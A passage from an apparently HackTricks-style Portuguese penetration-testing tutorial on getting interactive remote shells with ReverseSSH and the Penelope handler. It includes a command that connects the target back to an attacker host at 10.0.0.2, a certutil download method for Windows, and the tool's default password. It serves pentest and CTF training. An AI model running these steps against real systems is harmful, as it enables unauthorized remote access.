...
Uma forma conveniente de obter **acesso a shell interativo**, além de **transferências de arquivos** e **port forwarding**, é enviar o servidor ssh estaticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) para o alvo.<sup>[[1]](#references)</sup>

Abaixo está um exemplo para `x86` usando o binário compactado com UPX publicado pelo projeto. Para outras arquiteturas ou artefatos de release, use a [página de releases](https://github.com/Fahrj/reverse-ssh/releases/latest/) como referência de navegação.<sup>[[1]](#references)</sup>

1. Prepare o host local para receber a conexão SSH de entrada. No modo listener, `-l` ativa o listener e `-p 4444` seleciona a porta na qual ele aceita a conexão do alvo.<sup>[[1]](#references)</sup>
```bash
...
```
- (2a) Target Linux. Transfira o mesmo artefato `upx_reverse-sshx86` para `/dev/shm/reverse-ssh` e torne-o executável. O `-p 4444` do target seleciona a porta do listener acima, e `kali@10.0.0.2` fornece a conta e o host usados para estabelecer a conexão de retorno.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Alvo Windows. O PowerShell totalmente interativo requer o Windows 10 build 17763; consulte o [README do projeto](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
...
```
O exemplo para Windows usa `certutil` com `-f -urlcache`; a documentação da Microsoft descreve `-f` como responsável por forçar uma busca de URL e observa que os parâmetros disponíveis variam conforme a versão. Portanto, verifique `certutil -?` se esse formato não estiver disponível.<sup>[[12]](#references)</sup>

- Após a conexão reversa ser estabelecida, o listener em modo reverso do ReverseSSH faz bind na porta `8888` por padrão (ou no valor fornecido com `-b`), e as conexões recebidas aceitam qualquer nome de usuário com a senha padrão `letmeinbrudipls`. O shell remoto é executado com os privilégios da conta que iniciou `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
...
[Penelope](https://github.com/brightio/penelope) atualiza automaticamente reverse shells semelhantes ao Unix para PTY, redimensiona terminais semelhantes ao Unix e registra as interações com o shell; para shells do Windows, fornece readline, mas não redimensionamento do terminal em tempo real.<sup>[[2]](#references)</sup>

![Interface do handler de reverse shell do Penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
...
- [1] [ReverseSSH - servidor ssh estaticamente vinculado com funcionalidade de reverse shell para CTFs e outros](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - handler de shell que automatiza algumas tarefas para facilitar o trabalho](https://github.com/brightio/penelope)
...
- [13] [Nmap — Registro de alterações](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
